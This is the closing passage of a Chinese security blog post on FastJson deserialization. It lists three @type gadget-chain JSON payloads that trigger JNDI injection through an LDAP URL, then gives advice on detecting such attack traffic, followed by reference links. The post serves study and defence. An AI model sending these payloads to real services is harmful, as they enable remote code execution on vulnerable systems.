</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&#34;</span><span class=p>,</span><span class=nt>&#34;healthCheckRegistry&#34;</span><span class=p>:</span><span class=s2>&#34;ldap://localhost:1389/Exploit&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&#34;</span><span class=p>,</span> <span class=nt>&#34;tmJndiName&#34;</span><span class=p>:</span> <span class=s2>&#34;ldap://localhost:1389/Exploit&#34;</span><span class=p>,</span> <span class=nt>&#34;tmFromJndi&#34;</span><span class=p>:</span> <span class=kc>true</span><span class=p>,</span> <span class=nt>&#34;transactionManager&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;$ref&#34;</span><span class=p>:</span><span class=s2>&#34;$.transactionManager&#34;</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&#34;</span><span class=p>,</span> <span class=nt>&#34;tmJndiName&#34;</span><span class=p>:</span> <span class=s2>&#34;ldap://localhost:1389/Exploit&#34;</span><span class=p>,</span> <span class=nt>&#34;tmFromJndi&#34;</span><span class=p>:</span> <span class=kc>true</span><span class=p>,</span> <span class=nt>&#34;transactionManager&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;$ref&#34;</span><span class=p>:</span><span class=s2>&#34;$.transactionManager&#34;</span><span class=p>}}</span>
</span></span></code></pre></td></tr></table></div></div><p>一个很明显的流量特征，就是存在@type，这个@type特性正常业务用的很少（但是我也碰到过=-=&rsquo;&rsquo;&rsquo;），所以需要精准的判断攻击流量的话，可以在@type特征的基础上，再判断是否存在 <code>ldap</code> 、 <code>rmi</code> 、 <code>http</code> 等关键字（因为一般都是转换成JNDI注入了，需要特别关注下JNDI注入的关键字）。此外，还可以把在野Payload的关键字都加上黑名单。</p><h2 id=参考>参考</h2><ul><li><a href=https://paper.seebug.org/636/#2-getoutputproperties>https://paper.seebug.org/636/#2-getoutputproperties</a></li><li><a href=https://meizjm3i.github.io/2019/06/05/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B/>https://meizjm3i.github.io/2019/06/05/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B/</a></li><li><a href=https://paper.seebug.org/994/>https://paper.seebug.org/994/</a></li><li><a href=https://kumamon.fun/FastJson-checkAutoType/>https://kumamon.fun/FastJson-checkAutoType/</a></li></ul></div><div class=post-copyright><p class=copyright-item><span class=item-title>文章作者</span>
<span class=item-content>P1n93r</span></p><p class=copyright-item><span class=item-title>上次更新</span>
<span class=item-content>2021-07-04</span></p></div><footer class=post-footer><nav class=post-nav><a class=prev href=/post/security/attack_rmi/><i class="iconfont icon-left"></i>
<span class="prev-text nav-default">Attack RMI</span>
<span class="prev-text nav-mobile">上一篇</span></a>
<a class=next href=/post/security/jep290%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/><span class="next-text nav-default">JEP290机制学习</span>
<span class="next-text nav-mobile">下一篇</span>
<i class="iconfont icon-right"></i></a></nav></footer></article></div><div id=disqus_thread></div><script type=text/javascript>(function(){if(window.location.hostname==="localhost")return;var t,e=document.createElement("script");e.type="text/javascript",e.async=!0,t="p1n93r",e.src="//"+t+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript></div></main><footer id=footer class=footer><div class=social-links><a href=mailto:pin83r@gmail.com class="iconfont icon-email" title=email></a>
<a href=https://github.com/p1n93r class="iconfont icon-github" title=github></a>
<a href=https://p1n93r.github.io/index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a></div><div class=copyright><span class=power-by>由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动</span>
<span class=division>|</span>
<span class=theme-info>主题 -
<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span><div class=busuanzi-footer><span id=busuanzi_container_site_pv>本站总访问量 <span id=busuanzi_value_site_pv><img src=/img/spinner.svg alt=spinner.svg></span> 次</span>
<span class=division>|</span>
<span id=busuanzi_container_site_uv>本站总访客数 <span id=busuanzi_value_site_uv><img src=/img/spinner.svg alt=spinner.svg></span> 人</span></div><span class=copyright-year>&copy;
2019 -
2022<span class=heart><i class="iconfont icon-heart"></i></span><span>P1n93r</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script>
<script type=text/javascript src=/js/main.min.64437849d125a2d603b3e71d6de5225d641a32d17168a58106e0b61852079683.js></script></body></html>